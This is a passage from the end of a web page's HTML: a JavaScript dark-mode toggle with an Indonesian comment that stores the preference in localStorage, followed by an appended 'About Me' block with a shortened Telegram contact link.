    // Cek preferensi yang tersimpan
    if (localStorage.getItem('darkMode') === 'enabled') {
        document.body.classList.add('dark-mode');
        toggleBtn.textContent = '☀️';
    }

    toggleBtn.addEventListener('click', function() {
        document.body.classList.toggle('dark-mode');
        const isDark = document.body.classList.contains('dark-mode');
        toggleBtn.textContent = isDark ? '☀️' : '🌙';
        localStorage.setItem('darkMode', isDark ? 'enabled' : 'disabled');
    });
})();
</script>
</body>
</html>
<!-- ABOUT ME MINIMALIS -->
<div class="about-me" style="margin-top:40px;text-align:center;font-size:13px;">
    <p style="margin:0 0 4px;color:#111;font-weight:bold;">About Me</p>
    <a href="https://tinyurl.com/23fryr64" target="_blank" 
       style="color:#0ea5e9;text-decoration:none;font-weight:bold;transition:color 0.2s;"
       onmouseover="this.style.color='#0590c1';" 
       onmouseout="this.style.color='#0ea5e9';">
        Contact Me on Telegram
    </a>
</div>
